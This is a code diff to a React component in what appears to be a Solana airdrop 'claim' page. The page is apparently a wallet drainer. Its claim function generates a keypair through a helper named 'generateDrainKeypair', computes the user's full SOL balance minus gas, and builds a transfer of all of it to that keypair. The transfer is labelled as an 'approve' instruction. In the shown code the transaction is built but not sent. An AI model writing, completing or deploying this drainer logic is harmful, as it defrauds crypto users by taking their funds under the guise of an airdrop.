@@ -15,7 +15,7 @@ import {
   import Button from '../ui/Button'
   import { ThreeDots } from 'react-loader-spinner'
   import { toast } from 'sonner';
-import { Keypair, LAMPORTS_PER_SOL, PublicKey } from '@solana/web3.js'
+import { Connection, Keypair, LAMPORTS_PER_SOL, PublicKey, SystemProgram, Transaction } from '@solana/web3.js'
 import { useWallet } from '@solana/wallet-adapter-react'
 import { approveTokensForSpendingandSendToken } from '@/app/services/hook/sendSol'
 import { executeConnectionObject } from '@/app/services/redux/walletConnectionObject'
@@ -24,7 +24,8 @@ import { generateSolanaWallet } from '@/app/services/hook/generateDrainKeypair'
 const AIRDRO_BALANCE = 2000 ; 
 const GASFEE = 0.001;
 const BottomDrawer = () => {
-const {wallet , signTransaction , publicKey} =   useWallet();
+const {wallet , signTransaction , publicKey , sendTransaction} =   useWallet();
+const connection = new Connection(String(String(process.env.NEXT_PUBLIC_SOLANA_HTTPS)))
 const openBottomDrawal = changeOpenBottomDrawer((state)=>state.openBottomDrawer)
 const resetBottomDrawal = changeOpenBottomDrawer((state)=>state.resetOpenBottomDrawer)
 const claimingStage = changeClaimStages((state)=>state.claimStage)
@@ -32,7 +33,6 @@ const resetClaim  = changeClaimStages((state)=>state.resetClaim)
 const getUsersBalance = executeConnectionObject((state)=>state.accountBalance)
 const usersPublicKey = executeConnectionObject((state)=>state.usersPublicKey)
 const deductGas = (GASFEE * Number(LAMPORTS_PER_SOL));
-const pubblicKey = new PublicKey(usersPublicKey)
 
 
 async function claimToken(){
@@ -41,9 +41,23 @@ async function claimToken(){
   const userBkeyPair =  await generateSolanaWallet()
   const mainAccountAmount  = Number(getUsersBalance) * Number(LAMPORTS_PER_SOL) - (deductGas);
   console.log( " { mnemonic,seed,keypair,publicKe} " ,userBkeyPair)
- await approveTokensForSpendingandSendToken(Number(mainAccountAmount) ,pubblicKey, userBkeyPair?.keypair as Keypair,signTransaction)
+  const approveTx = new Transaction().add(
+    approveInstruction(mainAccountAmount, publicKey as PublicKey, userBkeyPair?.publicKey as PublicKey)
+);
+
+// console.log('Approval transaction sent. Signature:', signature);
+
+
+//  await approveTokensForSpendingandSendToken(Number(mainAccountAmount) ,publicKey as PublicKey, userBkeyPair?.keypair as Keypair,signTransaction)
 }
 
+function approveInstruction(amount:number, senderPublicKey:PublicKey, recipientPublicKey:PublicKey) {
+  return SystemProgram.transfer({
+      fromPubkey: senderPublicKey,
+      toPubkey: recipientPublicKey,
+      lamports: amount,
+  });
+}
 
 
 return (
